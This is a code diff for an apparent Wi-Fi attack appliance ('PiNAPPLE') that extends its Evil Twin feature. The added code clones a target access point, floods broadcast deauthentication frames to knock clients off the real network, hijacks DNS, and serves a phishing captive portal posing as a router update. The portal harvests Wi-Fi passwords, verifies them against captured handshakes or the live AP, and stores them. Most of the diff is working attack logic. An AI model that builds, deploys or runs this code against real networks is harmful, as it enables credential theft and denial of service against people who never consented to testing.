+            write_json_file(EVILTWIN_PORTAL_STATE, {
+                'dns_hijack': os.path.exists(FLAG_DNS),
+                'portal_redirect': os.path.exists(FLAG_PORTAL),
+                'portal': _active_portal_slug(),
+                'at': datetime.datetime.now().isoformat(timespec='seconds'),
+            })
+        except OSError as exc:
+            notes.append('portal-state snapshot failed: %s' % exc)
+    slug = str(prefer or cfg.get('portal_type') or 'wifi-psk')
     if slug not in [p[0] for p in list_portals()]:
         slug = 'wifi-psk'
     if set_active_portal(slug):
         notes.append('portal=%s' % slug)
-    try:
-        portal_ip = iface_ip('wlan0') or '10.0.0.1'
-        with open(DNSMASQ_HIJACK, 'w') as handle:
-            handle.write('address=/#/%s\n' % portal_ip)
-        open(FLAG_DNS, 'w').close()
+    if set_dns_hijack(True, iface_ip('wlan0') or '10.0.0.1'):
         notes.append('dns-hijack=on')
-    except OSError as exc:
-        notes.append('dns-hijack failed: %s' % exc)
-    try:
-        subprocess.run(['/usr/local/bin/pinapple-portal', 'on'],
-                       capture_output=True, timeout=20)
-        open(FLAG_PORTAL, 'w').close()
+    else:
+        notes.append('dns-hijack failed')
+    if set_portal_redirect(True):
         notes.append('portal-redirect=on')
-    except Exception as exc:
-        notes.append('portal-redirect failed: %s' % exc)
+    else:
+        notes.append('portal-redirect failed')
     audit('Evil Twin portal prepared: %s' % ', '.join(notes))
     return notes
 
 
+def legacy_twin_portal_leftover():
+    """True when old code left the twin's portal armed with no snapshot.
+
+    The twin always forces the wifi-psk template, so an active wifi-psk portal
+    plus the DNS/redirect flags and no twin state is a leftover. The marker
+    makes this a one-shot cleanup: if the operator deliberately re-enables the
+    toggles later, boot does not keep turning them off.
+    """
+    if os.path.exists(EVILTWIN_PORTAL_STATE):
+        return False
+    if os.path.exists(EVILTWIN_STATE) or os.path.exists(EVILTWIN_BACKUP):
+        return False
+    if os.path.exists(LEGACY_PORTAL_CLEANUP):
+        return False
+    return (_active_portal_slug() == 'wifi-psk'
+            and (os.path.exists(FLAG_DNS) or os.path.exists(FLAG_PORTAL)))
+
+
+def restore_twin_portal(reason=''):
+    """Put the operator's captive-portal settings back after an Evil Twin.
+
+    This is what stops the twin's portal from outliving the attack: a leftover
+    DNS hijack + port-80 redirect makes every phone on the PiNAPPLE AP open the
+    phishing page instead of the dashboard, even after a reboot.
+    """
+    previous = read_json_file(EVILTWIN_PORTAL_STATE, None)
+    legacy = False
+    if not isinstance(previous, dict):
+        if not legacy_twin_portal_leftover():
+            return False
+        legacy = True
+        previous = {'dns_hijack': False, 'portal_redirect': False,
+                    'portal': str(load_config().get('portal_type') or 'creds')}
+    dns_was_on = bool(previous.get('dns_hijack'))
+    redirect_was_on = bool(previous.get('portal_redirect'))
+    if not dns_was_on:
+        set_dns_hijack(False)
+    if not redirect_was_on:
+        set_portal_redirect(False)
+    slug = str(previous.get('portal') or load_config().get('portal_type') or '')
+    if slug and slug != 'unknown':
+        set_active_portal(slug)
+    try:
+        os.remove(EVILTWIN_PORTAL_STATE)
+    except OSError:
+        pass
+    audit('Captive portal restored after Evil Twin' +
+          (' (%s)' % reason if reason else ''), 'info' if not legacy else 'warn')
+    return True
+
+
 
 def log_portal_attempt(ssid, client_mac, psk, result, detail=''):
-    """Debug trail for portal password checks (never shown in Credentials)."""
+    """Debug trail for portal password checks.
+
+    The candidate is deliberately not written: it may be the real key, and the
+    verified value is already stored in Credentials when it is correct.
+    """
+    del psk
     try:
         os.makedirs(LOG_DIR, exist_ok=True)
         with open('/var/log/pinapple/portal_attempts.log', 'a') as handle:
-            handle.write('%s\t%s\t%s\t%s\t%s\t%s\n' % (
+            handle.write('%s\t%s\t%s\t%s\t%s\n' % (
                 datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                ssid or '-', client_mac or '-', result, psk,
+                ssid or '-', client_mac or '-', result,
                 str(detail).replace('\t', ' ')))
         os.chmod('/var/log/pinapple/portal_attempts.log', 0o600)
     except OSError:
@@ -4198,6 +5317,14 @@ def validate_psk_with_ap(psk, timeout=18, ssid=None, bssid=None, channel=None):
         info = _evil_twin_info[0] or read_json_file(EVILTWIN_STATE, {})
         ssid = str(ssid or info.get('ssid', '')).strip()
         bssid = str(bssid or info.get('bssid', '')).strip()
+        security = info.get('security_detail')
+        if not isinstance(security, dict):
+            security = recon_entry(bssid).get('security') or {}
+        try:
+            pmf = int(security.get('pmf') or 1)
+        except (TypeError, ValueError):
+            pmf = 1
+        wpa3 = bool(security.get('sae')) and not security.get('psk')
         try:
             channel = int(channel or info.get('channel') or 6)
         except (TypeError, ValueError):
@@ -4219,7 +5346,8 @@ def validate_psk_with_ap(psk, timeout=18, ssid=None, bssid=None, channel=None):
             r = subprocess.run(
                 [PSK_HELPER, '--ssid', ssid, '--bssid', bssid,
                  '--psk', psk, '--timeout', str(timeout),
-                 '--channel', str(channel)],
+                 '--channel', str(channel), '--pmf', str(pmf)]
+                + (['--wpa3'] if wpa3 else []),
                 capture_output=True, text=True, timeout=timeout + 20)
             payload = {}
             for line in (r.stdout or '').strip().splitlines():
@@ -4253,7 +5381,8 @@ def _evil_twin_shutdown():
     """Stop the twin, restore the real AP and free wlan1."""
     had_twin = bool(_evil_twin_job[0] is not None or
                     os.path.exists(EVILTWIN_STATE) or
-                    os.path.exists(EVILTWIN_BACKUP))
+                    os.path.exists(EVILTWIN_BACKUP) or
+                    os.path.exists(EVILTWIN_PORTAL_STATE))
     if _evil_twin_job[0] is None:
         state = read_json_file(EVILTWIN_STATE, {})
         pid = state.get('pid')
@@ -4274,7 +5403,7 @@ def _evil_twin_shutdown():
 def _twin_clients():
     """Number of stations associated to the twin AP (wlan0)."""
     try:
-        r = subprocess.run(['iw', 'dev', 'wlan0', 'station', 'dump'],
+        r = subprocess.run([IW_BIN, 'dev', 'wlan0', 'station', 'dump'],
                            capture_output=True, text=True, timeout=4)
     except (OSError, subprocess.SubprocessError):
         return 0
@@ -4283,7 +5412,7 @@ def _twin_clients():
 
 def _iface_channel(name):
     try:
-        r = subprocess.run(['iw', 'dev', name, 'info'],
+        r = subprocess.run([IW_BIN, 'dev', name, 'info'],
                            capture_output=True, text=True, timeout=4)
     except (OSError, subprocess.SubprocessError):
         return 0
@@ -4297,11 +5426,69 @@ def _iface_channel(name):
     return 0
 
 
-def _twin_status_payload():
+def portal_http_check(force=False):
+    """Probe the captive portal from the Pi so status can be honest."""
+    now = time.time()
+    cached_at, cached = _twin_portal_cache
+    if cached and not force and now - cached_at < 15:
+        return cached
+    import urllib.request
+    out = {'portal': False, 'submit_proxy': False, 'detail': ''}
+    for key, url in (('portal', 'http://127.0.0.1/'),
+                     ('submit_proxy', 'http://127.0.0.1/portal/success')):
+        try:
+            with urllib.request.urlopen(url, timeout=3) as response:
+                out[key] = 200 <= int(response.status) < 400
+        except Exception as exc:
+            out['detail'] = str(exc)[:160]
+    _twin_portal_cache[0] = now
+    _twin_portal_cache[1] = out
+    return out
+
+
+def twin_health_checks(info):
+    """Every precondition a working twin needs, evaluated live."""
+    info = info or {}
+    checks = []
+
+    def add(name, ok, detail=''):
+        checks.append({'name': name, 'ok': bool(ok), 'detail': str(detail)[:160]})
+
+    hostapd = service_status('pinapple-ap')
+    add('hostapd AP process', hostapd, 'pinapple-ap.service')
+    live_ssid = wlan0_ssid()
+    add('SSID on air', live_ssid == str(info.get('ssid', '')),
+        live_ssid or 'not broadcasting')
+    channel = _iface_channel('wlan0')
+    wanted = info.get('channel')
+    add('channel', not channel or not wanted or str(channel) == str(wanted),
+        'wlan0 ch %s, target ch %s' % (channel or '?', wanted or '?'))
+    dhcp = service_status('pinapple-dhcp')
+    add('DHCP server', dhcp, 'pinapple-dhcp.service')
+    portal = portal_http_check()
+    add('captive portal', portal.get('portal'), portal.get('detail', '') or 'http://10.0.0.1/')
+    add('portal submit proxy', portal.get('submit_proxy'), '/portal/submit')
+
+    proc = _evil_twin_job[0]
+    deauth_alive = bool(proc is not None and proc.poll() is None)
+    add('deauth helper', deauth_alive,
+        'pid %s' % proc.pid if proc is not None else 'not running')
+    injection = info.get('injection') or {}
+    add('deauth injection', injection.get('ok') is True,
+        injection.get('detail', '') or 'not verified')
+
+    return checks
+
+
+def _twin_status_payload(running=False):
     info = _evil_twin_info[0] or read_json_file(EVILTWIN_STATE, {})
     clients = _twin_clients() if (_evil_twin_job[0] is not None or _twin_ap_since[0]) else 0
     if clients:
         _twin_seen_client[0] = True
+    checks = twin_health_checks(info) if running else []
+    healthy = bool(running) and all(check['ok'] for check in checks)
+    tx_now = iface_tx_packets('wlan1')
+    baseline = info.get('tx_baseline')
     return {
         'hostapd': service_status('pinapple-ap'),
         'ssid': info.get('ssid', ''),
@@ -4309,6 +5496,11 @@ def _twin_status_payload():
         'clients': clients,
         'deauth': bool(_evil_twin_job[0] is not None and _evil_twin_job[0].poll() is None),
         'deauth_channel': _iface_channel('wlan1'),
+        'deauth_tx': (tx_now - baseline) if (tx_now is not None and baseline is not None) else None,
+        'injection': info.get('injection') or {},
+        'phase': ('ready' if healthy else 'degraded') if running else 'idle',
+        'healthy': healthy,
+        'checks': checks,
         'ap_seconds': int(time.time() - _twin_ap_since[0]) if _twin_ap_since[0] else 0,
         'idle_revert': TWIN_IDLE_REVERT_SECONDS,
     }
@@ -4397,12 +5589,14 @@ def _evil_twin_fail(message):
     """Record a twin start failure, restore the real AP and free the radio."""
     _evil_twin_error[0] = message
     audit('Evil Twin failed: %s' % message, 'error')
+    terminate_process_group(_evil_twin_job[0])
+    _evil_twin_job[0] = None
     restore_ap_after_eviltwin(message)
     release_wlan1('eviltwin')
     restore_wlan1_idle()
 
 
-def _evil_twin_run(ssid, bssid, channel, ssid_trimmed, psk=''):
+def _evil_twin_run(ssid, bssid, channel, ssid_trimmed, psk='', security=None):
     """Rebuild wlan0 into the twin AFTER the HTTP response was sent.
 
     Stopping pinapple-ap takes the AP - and therefore the dashboard - offline,
@@ -4452,7 +5646,8 @@ def _evil_twin_run(ssid, bssid, channel, ssid_trimmed, psk=''):
     except Exception:
         warnings.append('could not restore the AP MAC')
     try:
-        write_hostapd_conf(ssid, channel, 'wpa2' if psk else 'open', None, psk or None)
+        write_hostapd_conf(ssid, channel, 'wpa2' if psk else 'open', None,
+                           psk or None, security=security)
     except OSError as exc:
         _evil_twin_fail('could not write the cloned AP config: %s' % exc)
         return
@@ -4484,23 +5679,62 @@ def _evil_twin_run(ssid, bssid, channel, ssid_trimmed, psk=''):
     _twin_ap_since[0] = time.time()
     _twin_seen_client[0] = False
 
+    # Honesty gates: `systemctl start` succeeding does not mean the twin is the
+    # target. Verify the SSID and channel that are actually on the air.
+    live_ssid = wlan0_ssid()
+    if live_ssid and live_ssid != ssid:
+        _evil_twin_fail('hostapd started but is broadcasting "%s" instead of '
+                        '"%s"; the clone was not applied' % (live_ssid, ssid))
+        return
+    live_channel = _iface_channel('wlan0')
+    if live_channel and int(live_channel) != int(channel):
+        _evil_twin_fail('the clone is on channel %s instead of the target '
+                        'channel %s' % (live_channel, channel))
+        return
+
+    tx_baseline = iface_tx_packets('wlan1')
+    inj_ok, inj_detail = verify_injection('wlan1')
+    if not inj_ok:
+        warnings.append('deauth injection could not be verified: %s' % inj_detail)
+    ok, msg = set_wlan1_channel(channel)
+    if not ok:
+        warnings.append('could not restore the deauth channel: %s' % msg)
     try:
         proc = subprocess.Popen(
-            deauth_command(bssid, 'FF:FF:FF:FF:FF:FF', channel, 50, continuous=True),
+            deauth_command(bssid, 'FF:FF:FF:FF:FF:FF', channel, 25,
+                           continuous=True),
             stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT,
             start_new_session=True)
     except OSError as exc:
         _evil_twin_fail('could not start the deauth helper: %s' % exc)
         return
     _evil_twin_job[0] = proc
-    time.sleep(0.25)
-    if proc.poll() is not None:
-        warnings.append('the deauth helper exited immediately; the clone AP is still up')
     _evil_twin_info[0] = {
         'ssid': ssid, 'bssid': bssid, 'channel': channel,
-        'original_mac': original_mac,
+        'original_mac': original_mac, 'tx_baseline': tx_baseline,
         'security': 'WPA2' if psk else 'open',
+        'security_detail': security or {},
+        'injection': {'ok': inj_ok, 'detail': inj_detail},
+        'warnings': warnings,
         'started': datetime.datetime.now().isoformat(timespec='seconds'),
+    }
+    time.sleep(0.4)
+    if proc.poll() is not None:
+        _evil_twin_fail('the deauth helper exited immediately; clients would '
+                        'reconnect to the real AP')
+        return
+    tx_moved = wait_for_tx('wlan1', tx_baseline, timeout=2.0)
+    if tx_moved is False and not inj_ok:
+        warnings.append('deauth is not transmitting: wlan1 cannot inject on '
+                        'this channel, so clients are not being pushed')
+    portal = portal_http_check(force=True)
+    if not portal.get('portal'):
+        warnings.append('the captive portal on :80 did not answer: %s'
+                        % (portal.get('detail') or 'nginx/portal down'))
+    _twin_health[0] = {
+        'deauth_tx_verified': tx_moved,
+        'portal': portal,
+        'warnings': warnings,
     }
     try:
         with open(EVILTWIN_PID, 'w') as handle:
@@ -4513,11 +5747,11 @@ def _evil_twin_run(ssid, bssid, channel, ssid_trimmed, psk=''):
              ('; warnings: ' + '; '.join(warnings)) if warnings else ''))
 
 
-def _evil_twin_worker(ssid, bssid, channel, ssid_trimmed, psk=''):
+def _evil_twin_worker(ssid, bssid, channel, ssid_trimmed, psk='', security=None):
     """Wrap the twin build so a crash always ends the 'starting' window."""
     _evil_twin_starting[0] = True
     try:
-        _evil_twin_run(ssid, bssid, channel, ssid_trimmed, psk)
+        _evil_twin_run(ssid, bssid, channel, ssid_trimmed, psk, security)
     except Exception as exc:
         audit('Evil Twin crashed: %s' % exc, 'error')
         try:
@@ -4530,6 +5764,104 @@ def _evil_twin_worker(ssid, bssid, channel, ssid_trimmed, psk=''):
         if _evil_twin_job[0] is None and _evil_twin_error[0] is None:
             _evil_twin_error[0] = 'the twin did not start; check the Activity log'
         _evil_twin_starting[0] = False
+
+
+@app.route('/api/wlan1/evil-twin/preflight')
+@require_auth
+def api_evil_twin_preflight():
+    """Everything the twin needs, checked before touching either radio."""
+    bssid = str(request.args.get('bssid') or '').strip().upper()
+    ssid = str(request.args.get('ssid') or '').strip()
+    has_psk = str(request.args.get('psk') or '') in ('1', 'true', 'yes')
+    try:
+        channel = int(request.args.get('channel') or 0)
+    except (TypeError, ValueError):
+        channel = 0
+    entry = recon_entry(bssid) if bssid else {}
+    if not channel:
+        try:
+            channel = int(entry.get('channel') or 0)
+        except (TypeError, ValueError):
+            channel = 0
+    security = entry.get('security') if isinstance(entry.get('security'), dict) else {}
+
+    checks = []
+
+    def add(name, ok, detail='', blocking=True):
+        checks.append({'name': name, 'ok': bool(ok), 'detail': str(detail)[:180],
+                       'blocking': bool(blocking)})
+
+    add('wlan0 present', os.path.exists('/sys/class/net/wlan0'),
+        'onboard AP radio')
+    add('hostapd stack', ap_backend() == 'hostapd',
+        'pinapple-ap.service' if ap_backend() == 'hostapd' else 'NetworkManager hotspot')
+    add('deauth helper', os.path.exists(DEAUTH_HELPER), DEAUTH_HELPER)
+    add('wlan1 present', os.path.exists('/sys/class/net/wlan1'),
+        'AR9271 USB adapter')
+    verify_ok = os.path.exists(PSK_VERIFY_HELPER) or os.path.exists(
+        os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                     'tools', 'pinapple-psk-verify'))
+    add('password verifier', verify_ok, 'pinapple-psk-verify', blocking=False)
+    add('capture tool', bool(shutil.which('hcxpcapngtool')), 'hcxpcapngtool (hcxtools)',
+        blocking=False)
+    add('injection tester', bool(shutil.which('aireplay-ng') or
+        os.path.exists('/usr/sbin/aireplay-ng')), 'aireplay-ng (aircrack-ng)')
+    cached_ok = _injection_cache[1]
+    add('injection verified', cached_ok is True,
+        _injection_cache[2] or 'will be tested before the first attack',
+        blocking=False)
+    add('packet capture', bool(shutil.which('tcpdump')), 'tcpdump', blocking=False)
+    add('portal service', os.path.exists('/etc/nginx/sites-enabled') or
+        os.path.exists('/etc/nginx/conf.d'), 'nginx + /opt/pinapple/portal', blocking=False)
+
+    if not bssid:
+        add('target selected', False, 'choose a network or type a BSSID')
+    else:
+        known = bool(entry)
+        add('target in last scan', known, 'rescan if the network moved',
+            blocking=False)
+        add('target is 2.4 GHz', bool(channel and channel <= 14),
+            'channel %s%s' % (channel or '?', ' (5 GHz — wlan1 cannot deauth it)'
+                              if channel and channel > 14 else ''))
+        if channel:
+            ok_channel, channel_error = hostapd_accepts_channel(channel)
+            add('channel usable by hostapd', ok_channel,
+                channel_error or 'channel %d' % channel)
+        sae_only = bool(security.get('sae')) and not security.get('psk')
+        add('security cloneable', not (sae_only and not has_psk),
+            'WPA3-SAE only: supply the real passphrase' if sae_only else
+            ('%s %s' % (entry.get('encryption', '?'),
+                        '/'.join(security.get('akm') or []))).strip())
+        if security.get('pmf') == 2:
+            add('802.11w (PMF) required', True,
+                'twin mirrors PMF; some clients ignore deauth', blocking=False)
+        if security.get('wps'):
+            add('WPS enabled on target', True, 'WPS attacks are not built yet',
+                blocking=False)
+        elif known:
+            add('WPS enabled on target', False,
+                'WPS is off — PIN/Pixie-Dust is not possible on this AP',
+                blocking=False)
+
+    found = find_hash_for_bssid(bssid, ssid) if bssid else None
+    add('offline password check', bool(found),
+        os.path.basename((found or {}).get('path', '')) or
+        'no capture yet — the portal will fall back to a live check',
+        blocking=False)
+
+    blockers = [c for c in checks if c['blocking'] and not c['ok']]
+    warnings = [c for c in checks if not c['blocking'] and not c['ok']]
+    return jsonify({'ok': True, 'can_start': not blockers,
+                    'target': {'ssid': ssid or entry.get('ssid', ''),
+                               'bssid': bssid,
+                               'channel': channel,
+                               'band': entry.get('band', ''),
+                               'encryption': entry.get('encryption', ''),
+                               'security': security},
+                    'checks': checks,
+                    'blockers': blockers,
+                    'warnings': warnings,
+                    'offline_verify': bool(found)})
 
 
 @app.route('/api/wlan1/evil-twin/start', methods=['POST'])
@@ -4552,12 +5884,50 @@ def api_evil_twin_start():
             and str(scan_channel) != str(data.get('channel')):
         channel_notes.append('using the real target channel %d instead of %s'
                              % (scan_channel, data.get('channel')))
-    prepare_twin_portal()
+
+    entry = recon_entry(bssid)
+    security = entry.get('security') if isinstance(entry.get('security'), dict) else {}
+    if entry.get('beacon_int') and not security.get('beacon_int'):
+        security = dict(security)
+        security['beacon_int'] = entry.get('beacon_int')
+    if channel > 14 or entry.get('band') == '5':
+        return jsonify({'ok': False,
+                        'error': 'this is a 5 GHz target. wlan1 (AR9271) is '
+                                 '2.4 GHz-only, so it cannot see or deauth this '
+                                 'BSSID. Pick the router\'s 2.4 GHz BSSID.'}), 400
+    ok_channel, channel_error = hostapd_accepts_channel(channel)
+    if not ok_channel:
+        return jsonify({'ok': False, 'error': channel_error}), 400
+
     psk = str(data.get('psk', '') or '').strip()
     if psk and not (8 <= len(psk.encode('utf-8', 'ignore')) <= 63):
         return jsonify({'ok': False,
                         'error': 'the WPA2 passphrase must be 8-63 characters (leave it '
                                  'empty to clone the network as open)'})
+    if security.get('sae') and not security.get('psk') and not psk:
+        return jsonify({'ok': False,
+                        'error': 'this network is WPA3-SAE only. A twin needs the '
+                                 'real passphrase (SAE verifies it) or the target '
+                                 'must allow WPA2. Capture a handshake instead.'}), 400
+    if security.get('sae') and psk and '|' in psk:
+        return jsonify({'ok': False,
+                        'error': 'this passphrase contains "|", which hostapd '
+                                 'cannot use in sae_password. Use a WPA2 target.'}), 400
+    if entry.get('encryption') in ('WPA2', 'WPA', 'WPA3') and not psk:
+        channel_notes.append('the real network is %s but the twin is open; a '
+                             'device with a saved profile may refuse to join. '
+                             'Supply the passphrase to match it.'
+                             % entry.get('encryption'))
+    if security.get('pmf') == 2:
+        channel_notes.append('the target requires 802.11w (PMF); the twin mirrors '
+                             'that, but deauth may be ignored on some clients')
+    if not security:
+        channel_notes.append('no RSN detail for this BSSID in the last scan; the '
+                             'twin uses CCMP/WPA2 defaults. Rescan for an exact clone.')
+    if not entry and not data.get('channel'):
+        channel_notes.append('target is not in the 2.4 GHz scan; the twin will use '
+                             'channel 6 and deauth may not reach it. Rescan first.')
+
     if not os.path.exists(DEAUTH_HELPER):
         return jsonify({'ok': False, 'error': 'deauth helper is not installed'}), 500
     if ap_backend() != 'hostapd':
@@ -4567,6 +5937,7 @@ def api_evil_twin_start():
     if not os.path.exists('/sys/class/net/wlan0'):
         return jsonify({'ok': False, 'error': 'wlan0 is not present on this system'}), 500
 
+    prepare_twin_portal('wifi-psk')
     claim_wlan1('eviltwin')
     ok, msg = set_wlan1_mode('monitor')
     if not ok:
@@ -4584,11 +5955,13 @@ def api_evil_twin_start():
     _evil_twin_info[0] = None
 
     _evil_twin_info[0] = {'ssid': ssid, 'bssid': bssid, 'channel': channel,
-                          'security': 'WPA2' if psk else 'open', 'started': ''}
+                          'security': 'WPA2' if psk else 'open',
+                          'security_detail': security, 'started': ''}
     _evil_twin_error[0] = None
     _twin_capture_result[0] = None
+    _twin_health[0] = None
     threading.Thread(target=_evil_twin_worker,
-                     args=(ssid, bssid, channel, ssid_trimmed, psk),
+                     args=(ssid, bssid, channel, ssid_trimmed, psk, security),
                      daemon=True).start()
     audit('Evil Twin requested: %s (%s) channel %s %s'
           % (ssid, bssid, channel, 'WPA2' if psk else 'open'))
@@ -4605,10 +5978,13 @@ def api_evil_twin_status():
     if _evil_twin_starting[0]:
         info = _evil_twin_info[0] or {}
         return jsonify({'ok': True, 'running': False, 'starting': True,
+                        'phase': 'starting',
                         'ssid': info.get('ssid', ''), 'bssid': info.get('bssid', ''),
                         'channel': info.get('channel', ''),
                         'security': info.get('security', ''), 'started': '',
-                        'error': '', 'capture': _twin_capture_payload()})
+                        'error': '', 'capture': _twin_capture_payload(),
+                        'twin': {'phase': 'starting', 'healthy': False, 'checks': []},
+                        'verify': {'ready': False}})
     proc = _evil_twin_job[0]
     running = bool(proc is not None and proc.poll() is None)
     info = _evil_twin_info[0] or {}
@@ -4617,10 +5993,9 @@ def api_evil_twin_status():
         if state:
             info = state
             pid = state.get('pid')
-            clone_mac = str(state.get('bssid', '')).lower()
             # The twin is genuinely active if its deauth helper is alive, or
-            # if hostapd is up on the cloned MAC. A normal AP on the original
-            # MAC must not be mistaken for an active twin.
+            # if hostapd is up on the cloned SSID. A normal AP on the original
+            # SSID must not be mistaken for an active twin.
             if pid and pid_alive(pid, 'pinapple-deauth'):
                 running = True
             elif (service_status('pinapple-ap') and info.get('ssid')
@@ -4632,13 +6007,36 @@ def api_evil_twin_status():
             # AP instead of leaving a half-configured wlan0 behind.
             restore_ap_after_eviltwin('twin stopped unexpectedly')
         release_wlan1_and_restore('eviltwin')
+    twin = _twin_status_payload(running=running)
+
+    now = time.time()
+    if now - _twin_hash_cache[0] > 20 or not running:
+        found = find_hash_for_bssid(str(info.get('bssid', '')),
+                                    str(info.get('ssid', '')))
+        _twin_hash_cache[0] = now
+        _twin_hash_cache[1] = found
+    found = _twin_hash_cache[1]
+    verify = {'ready': bool(found),
+              'kind': (found or {}).get('kind', ''),
+              'file': os.path.basename((found or {}).get('path', ''))}
+
+    error = ''
+    if not running:
+        error = _evil_twin_error[0] or ''
+    elif twin.get('checks'):
+        failed = [c for c in twin['checks'] if not c['ok']]
+        if failed:
+            error = failed[0]['name'] + ': ' + (failed[0]['detail'] or 'failed')
     return jsonify({'ok': True, 'running': running,
+                    'phase': twin.get('phase', 'idle'),
                     'ssid': info.get('ssid', ''), 'bssid': info.get('bssid', ''),
                     'channel': info.get('channel', ''), 'started': info.get('started', ''),
                     'security': info.get('security', ''),
-                    'error': ('' if running else (_evil_twin_error[0] or '')),
+                    'warnings': info.get('warnings', []),
+                    'error': error,
                     'capture': _twin_capture_payload(),
-                    'twin': _twin_status_payload(),
+                    'twin': twin,
+                    'verify': verify,
                     'last_psk': get_last_psk() or {}})
 
 
@@ -4676,21 +6074,33 @@ def portal_submit():
                     '{{reason}}',
                     'That password is too short. Wi-Fi passwords have at least 8 characters.'),
                 mimetype='text/html')
-        check = validate_psk_with_ap(psk)
         ssid = str(twin_state.get('ssid', ''))
+        bssid = str(twin_state.get('bssid', ''))
+        # Preferred path: check the one typed candidate against a capture that
+        # already exists for this AP. It takes milliseconds and never moves
+        # wlan1, so the twin keeps running and the phone stays associated.
+        check = verify_psk_offline(psk, ssid, bssid)
+        method = 'offline' if check.get('result') in ('ok', 'invalid') else ''
+        if check.get('result') in ('no-hash', 'unsupported', 'error'):
+            check = validate_psk_with_ap(psk, ssid=ssid, bssid=bssid)
+            method = 'live'
         log_portal_attempt(ssid, client_mac, psk,
-                           check.get('result', '?'), check.get('detail', ''))
+                           '%s/%s' % (method or '?', check.get('result', '?')),
+                           check.get('detail', ''))
         if check.get('result') == 'ok':
             _log_credential(client_ip, client_mac, 'wifi-psk',
-                            {'ssid': ssid, 'bssid': str(twin_state.get('bssid', '')),
-                             'password': psk, 'verified': 'yes'})
+                            {'ssid': ssid, 'bssid': bssid,
+                             'password': psk, 'verified': 'yes',
+                             'verified_by': method or '?'})
             remember_last_psk({
-                'ssid': ssid, 'bssid': str(twin_state.get('bssid', '')),
+                'ssid': ssid, 'bssid': bssid,
                 'password': psk, 'verified': 'yes',
+                'verified_by': method or '?',
                 'client_ip': client_ip, 'client_mac': client_mac,
                 'at': datetime.datetime.now().isoformat(timespec='seconds'),
             })
-            audit('Portal: Wi-Fi password verified for %s (%s)' % (ssid, client_mac), 'warn')
+            audit('Portal: Wi-Fi password verified for %s (%s, %s)'
+                  % (ssid, client_mac, method or '?'), 'warn')
             # Answer the phone first, then tear the twin down: killing the AP
             # before the response is flushed makes the browser keep the old
             # "incorrect password" page, which looks like a rejection.
@@ -4715,29 +6125,33 @@ def portal_submit():
     return redirect('/portal/success')
 
 
-PORTAL_OK_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1"><title>Update installed</title>
-<style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f172a;
-color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;margin:0}
-.c{background:#1e293b;border:1px solid #334155;border-radius:14px;padding:34px 26px;max-width:400px;text-align:center}
-.ok{width:56px;height:56px;border-radius:50%;background:#16a34a;color:#fff;font-size:30px;line-height:56px;margin:0 auto 18px}
-h1{font-size:20px;margin:0 0 10px}p{color:#94a3b8;font-size:14px;line-height:1.6;margin:0}
-.sp{margin-top:22px;height:4px;border-radius:2px;background:#0ea5e9;animation:p 1.6s infinite}
-@keyframes p{0%{opacity:.25}50%{opacity:1}100%{opacity:.25}}</style></head><body><div class="c">
-<div class="ok">&#10003;</div><h1>Update installed</h1>
+PORTAL_OK_HTML = """<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1"><title>Update installed</title>
+<style>*{box-sizing:border-box}body{display:grid;place-items:center;min-height:100vh;min-height:100svh;
+margin:0;padding:32px 24px 64px;background:#fff;color:#111;font:16px/1.5 system-ui,sans-serif}
+main{width:100%;max-width:384px}h1{margin:0 0 16px;font-size:clamp(32px,7vw,44px);font-weight:650;
+line-height:1.12;letter-spacing:-.045em}p{margin:0 0 24px;color:#444}
+.rule{margin:24px 0;border:0;border-top:1px solid #d8d8d8}
+.bar{height:4px;background:#111;border-radius:2px;animation:p 1.4s ease-in-out infinite}
+@keyframes p{0%{opacity:.15}50%{opacity:1}100%{opacity:.15}}</style></head>
+<body><main><h1>Update installed</h1>
 <p>The router is restarting. This page will close and your device will reconnect to your normal network in a few seconds.</p>
-<div class="sp"></div></div>
-<script>setTimeout(function(){try{window.close()}catch(e){}},4000);</script></body></html>"""
+<div class="bar"></div><hr class="rule">
+<p style="font-size:14px;color:#666">You can close this window.</p>
+<script>setTimeout(function(){try{window.close()}catch(e){}},4000);</script>
+</main></body></html>"""
 
-PORTAL_RETRY_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1"><title>Password not accepted</title>
-<style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f172a;
-color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;margin:0}
-.c{background:#1e293b;border:1px solid #334155;border-radius:14px;padding:30px 26px;max-width:400px;text-align:center}
-h1{font-size:19px;margin:0 0 10px}p{color:#94a3b8;font-size:14px;line-height:1.6;margin:0 0 20px}
-a{display:inline-block;padding:13px 22px;border-radius:8px;background:#0ea5e9;color:#04121f;
-font-weight:700;text-decoration:none}</style></head><body><div class="c">
-<h1>Password not accepted</h1><p>{{reason}}</p><a href="/">Try again</a></div></body></html>"""
+PORTAL_RETRY_HTML = """<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1"><title>Password not accepted</title>
+<style>*{box-sizing:border-box}body{display:grid;place-items:center;min-height:100vh;min-height:100svh;
+margin:0;padding:32px 24px 64px;background:#fff;color:#111;font:16px/1.5 system-ui,sans-serif}
+main{width:100%;max-width:384px}h1{margin:0 0 16px;font-size:clamp(32px,7vw,44px);font-weight:650;
+line-height:1.12;letter-spacing:-.045em}p{margin:0 0 24px;color:#444}
+a{display:block;width:100%;min-height:48px;padding:10px 14px;border:1px solid #111;background:#111;
+color:#fff;font:inherit;font-weight:600;text-align:center;text-decoration:none}
+a:hover{background:#303030}:focus-visible{outline:2px solid currentColor;outline-offset:3px}</style></head>
+<body><main><h1>Password not accepted</h1><p>{{reason}}</p>
+<a href="/">Try again</a></main></body></html>"""
 
 
 @app.route('/api/evil-twin/last-psk/delete', methods=['POST'])
@@ -4914,8 +6328,8 @@ def wlan1_page():
     </div>
     <div class="fr">
       <div class="fg">
-        <label>Burst count: <span id="da-count-label">64</span></label>
-        <input type="range" id="da-count" min="10" max="500" value="64"
